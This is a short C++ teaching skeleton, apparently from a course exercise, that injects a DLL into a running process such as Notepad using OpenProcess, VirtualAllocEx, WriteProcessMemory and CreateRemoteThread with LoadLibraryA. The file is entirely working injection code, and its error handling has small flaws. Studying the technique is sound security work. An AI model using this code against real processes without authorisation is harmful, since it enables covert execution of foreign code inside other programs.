// Barak Gonen 2019
// Skeleton code - inject DLL to a running process
#include <iostream>
#include <Windows.h>
#include <string>
using std::string;
int main()
{
	// Get full path of DLL to inject
	char buffer[50];
	std::cout << "Enter notepad proccces id: ";
	std::cin >> buffer;
	if (buffer == NULL)
	{
		std::cout << "the id can't be NULL\n";
		return 1;
	}
	int proccesId = std::stoi(buffer); //proccesId of the proccess you want to inject (2 in README) {line 12}
	const char* dllPath = "C:\\assembly\\week17\\DLLinjection\\x64\\Debug\\DLLinjection.dll";
	string path = dllPath;			//this is the full path of DLLinjection change it to your path (1 in README) {line 19}
	DWORD pathLen = path.size();
	// Get LoadLibrary function address –
	// the address doesn't change at remote process					
	PVOID addrLoadLibrary = (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		// Open remote process
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,TRUE, proccesId);
	// Get a pointer to memory location in remote process,
	// big enough to store DLL path
	PVOID memAddr = (PVOID)VirtualAllocEx(proc, NULL, pathLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == memAddr) {
		DWORD err = GetLastError();
		return 0;
	}
	// Write DLL name to remote process memory
	bool check = WriteProcessMemory(proc, memAddr, (LPCVOID)dllPath, pathLen, NULL);
	if (0 == check) {
		DWORD err = GetLastError();
		return 0;
	}
	// Open remote thread, while executing LoadLibrary
	// with parameter DLL name, will trigger DLLMain
	HANDLE hRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addrLoadLibrary, (LPVOID)memAddr, 0, NULL);
	if (NULL == hRemote) {
		DWORD err = GetLastError();
		return 0;
	}
	WaitForSingleObject(hRemote, INFINITE);
	check = CloseHandle(hRemote);
	return 0;
}